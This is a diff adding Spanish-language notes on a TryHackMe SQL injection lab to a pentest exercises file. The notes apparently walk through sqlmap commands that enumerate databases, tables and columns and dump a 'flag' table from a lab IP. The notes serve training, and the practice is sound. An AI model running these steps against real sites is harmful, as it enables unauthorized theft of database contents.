@@ -628,6 +628,39 @@ adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt
 adb pull sdcard/log.txt /home/mmurphy/Desktop
 
 ```
+## SQLMAP ( tryhackme )
+
+Primero que nada tenemos que identificar la peticion que podria ser vulnerable se podria con el burpsuite o incluso con el firefox..
+
+```
+curl 'http://10.10.137.157/blood/view.php?id=1'
+```
+
+En este caso puede ser esta o la peticion porque es un GET pero podria ser un Post con lo que hacemos asi copy to file
+
+![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/6f6a79ba-4faf-42e4-8dbf-06295d4b8ac0)
+
+Paso uno intentar enumerarar la base de datos dbs
+
+```
+sqlmap -r req.txt -p username --dbs  
+```
+Ya que tenemos las bases de datos vamos poco a poco iniciando cuanod ya se tiene algo en concreto como la el nombre de la base de datos se comienza a escribir con mayuscula -D y lo que varia es con minusculas --tables
+
+```
+sqlmap -r req.txt -p username -D blood --tables  
+```
+
+Entonces ahora ya tenemos la tabla es una constante
+
+```
+sqlmap -r req.txt -p username -D blood -T flag --columns
+```
+Y finalmente pues usamos el DUMP
+
+```
+`sqlmap -r req.txt -p username -D blood -T flag --dump 
+```
 
 
 ## Bibliografias 
